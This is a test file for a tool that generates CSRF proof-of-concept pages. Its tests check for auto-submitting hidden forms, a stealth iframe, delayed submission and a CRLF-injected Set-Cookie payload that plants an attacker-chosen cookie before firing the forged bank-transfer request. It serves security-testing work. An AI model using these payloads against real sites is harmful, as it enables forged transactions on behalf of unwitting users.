import { describe, it, expect } from 'vitest';
import { generateHtmlFormPoc } from '../../lib/generator/htmlFormGenerator';
import { ParsedRequest } from '../../types';

describe('HTML Form Generator', () => {
  const req: ParsedRequest = {
    id: 'req-1',
    method: 'POST',
    url: 'https://bank.com/transfer',
    headers: { host: 'bank.com' },
    cookies: { sid: '123' },
    body: 'to=bob&amount=1000',
    contentType: 'application/x-www-form-urlencoded',
    timestamp: Date.now(),
  };

  it('generates auto-submitting form with hidden inputs', () => {
    const poc = generateHtmlFormPoc(req, { autoSubmit: true });

    expect(poc).toContain('action="https://bank.com/transfer"');
    expect(poc).toContain('method="POST"');
    expect(poc).toContain('name="to" value="bob"');
    expect(poc).toContain('name="amount" value="1000"');
    expect(poc).toContain("document.getElementById('csrf_form').submit();");
  });

  it('generates stealth iframe when stealthIframe option is enabled', () => {
    const poc = generateHtmlFormPoc(req, { stealthIframe: true });

    expect(poc).toContain('<iframe name="csrf_forge_stealth_frame"');
    expect(poc).toContain('target="csrf_forge_stealth_frame"');
  });

  it('generates manual submit button when autoSubmit is false', () => {
    const poc = generateHtmlFormPoc(req, { autoSubmit: false, buttonText: 'Confirm Transfer' });

    expect(poc).toContain('Confirm Transfer');
    expect(poc).not.toContain("document.getElementById('csrf_form').submit();");
  });

  it('adds setTimeout when delayMs is configured', () => {
    const poc = generateHtmlFormPoc(req, { autoSubmit: true, delayMs: 2000 });

    expect(poc).toContain('setTimeout(function() {');
    expect(poc).toContain('2000');
  });

  it('injects pre-flight cookie payload with onerror trigger and autoSubmit', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      preflight: {
        enabled: true,
        url: 'https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER-KEY; SameSite=None',
        triggerMode: 'onerror',
      },
    });

    expect(poc).toContain('<img src="https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER-KEY; SameSite=None"');
    expect(poc).toContain('onerror="document.getElementById(\'csrf_form\').submit();"');
    // Ensure separate bottom script is not included to avoid race condition
    expect(poc).not.toContain('<script>\n      // Auto-submit on DOM payload execution');
  });

  it('extracts URL when user pastes full <img> tag into preflight', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      preflight: {
        enabled: true,
        url: '<img src="https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=MYKEY" onerror="document.forms[0].submit()">',
        triggerMode: 'onerror',
      },
    });

    expect(poc).toContain('<img src="https://victim.com/?search=test%0d%0aSet-Cookie:%20csrfKey=MYKEY"');
    expect(poc).toContain('onerror="document.getElementById(\'csrf_form\').submit();"');
    // Does not have nested <img src="<img src=...
    expect(poc).not.toContain('src="&lt;img');
  });

  it('supports pre-flight with onload and delayMs', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      delayMs: 1500,
      preflight: {
        enabled: true,
        url: 'https://victim.com/image.png',
        triggerMode: 'onload',
      },
    });

    expect(poc).toContain('<img src="https://victim.com/image.png"');
    expect(poc).toContain('onload="setTimeout(function() { document.getElementById(\'csrf_form\').submit(); }, 1500);"');
  });

  it('supports pre-flight with fetch mode', () => {
    const poc = generateHtmlFormPoc(req, {
      autoSubmit: true,
      preflight: {
        enabled: true,
        url: 'https://victim.com/api/seed',
        triggerMode: 'fetch',
      },
    });

    expect(poc).toContain('fetch("https://victim.com/api/seed", { mode: \'no-cors\' })');
    expect(poc).toContain("document.getElementById('csrf_form').submit();");
  });
});
